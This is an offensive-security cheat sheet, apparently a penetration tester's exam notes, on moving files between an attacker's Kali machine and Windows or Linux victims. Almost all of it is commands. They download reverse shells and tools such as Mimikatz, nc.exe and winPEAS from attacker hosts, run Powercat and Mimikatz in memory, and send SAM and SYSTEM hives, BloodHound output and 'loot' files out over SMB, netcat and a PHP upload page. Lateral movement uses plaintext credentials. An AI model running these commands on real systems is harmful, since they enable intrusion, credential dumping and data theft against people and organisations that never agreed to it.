# Transferring Files

BEST RESOURCE: "https://github.com/eMVee-NL/MindMap/tree/main/File-Transfer"

Nothing is 100% bullet-proof. Have several options.

### Powershell Linux to Windows

```bash
(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:8000/chisel.exe','C:\Windows\Tasks\chisel.exe')
```

### SMB Linux to Windows

```bash
impacket-smbserver -smb2support Share .
cmd.exe /c //kali_ip/Share/shell443.exe
```

```bash
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\kali_ip\share /u:df df
copy \\kali_ip\share\shell443.exe
```

```bash
impacket-smbserver -smb2support Share .
net use \\kali_ip\share
copy \\kali_ip\share\whoami.exe
```

### Windows http server Linux to Windows

```bash
python3 -m http.server 80
certutil -urlcache -split -f http://kali_ip/shell.exe C:\\Windows\temp\shell.exe
```

```bash
Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
```

#### Transfer Files with NetCat

On your computer:

```bash
nc -l -p 12345 > received_file
```

On the remote computer, Windows in this case:

```bash
Get-Content .\yourfile.txt -Raw | nc.exe <Your_IP_Address> 12345
```

#### Errors

```bash
Access is denied. In this case try Invoke-WebRequest for powershell
```

#### Host Simple FTP Server

```bash
python -m pyftpdlib -w
```

### Powercat

Host powercat.ps1 in a webserver on the attacker machine.

Execute..

```bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://kali-ip/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoTransfer"
```

On kali..

```bash
wget http://windows-ip:4444/FileToTransfer
```

### SMB Shares Windows to Windows

```bash
In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   
 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
```

#### Accessing $C Drive of Computer A

```bash
*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
```

#### Copying over files

```bash
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
```

### SMB Server Bi-directional

```bash
impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
```

#### Authenticated

```bash
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

```bash
impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\evil.file
```

#### Host an Apache Web Server

```bash
sudo systemctl start apache2
cp file.txt /var/www/html/
sudo php -S 0.0.0.0:80
# You can access the files on port 80 of your machine/ip
```

### PHP Script Windows to Linux

```bash
cat upload.php
chmod +x upload.php
```

```bash
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

```bash
sudo mkdir /var/www/uploads
```

```bash
mv upload.php /var/www/uploads
```

```bash
service apache2 start
ps -ef | grep apache
```

Use a webbrowser on the victim to access the page and upload the desired file or use the below powershell to accomplish the same..

```bash
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:9999/upload.php', '.\dc_20240822153055_BloodHound.zip')"
powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:8888/upload.php', 'bloodhound.zip')
```

```bash
service apache2 stop
```

powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.178:90/upload.php', 'bloodhound.zip')

### TFTP

Uploading files with TFTP.

```bash
root@kali:~# mkdir /tftp
root@kali:~# atftpd --daemon --port 69 /tftp
root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
```

#### Dump

```bash
Invoke-WebRequest https://$myip/PowerView.ps1 -OutFile PowerView.ps1  # Download a file with PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://$myip/Invoke-Mimikatz.ps1')   # Execute a file in memory using PowerShell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64  # Upload a file with PowerShell
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe  #  Download a file using Bitsadmin
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe  #  Download a file using Certutil
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh # Download a file using Wget
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh # Download a file using cURL
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);' # Download a file using PHP
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip # Upload a file using SCP
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe #  Download a file using SCP
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe" # Invoke-WebRequest using a Chrome User Agent
```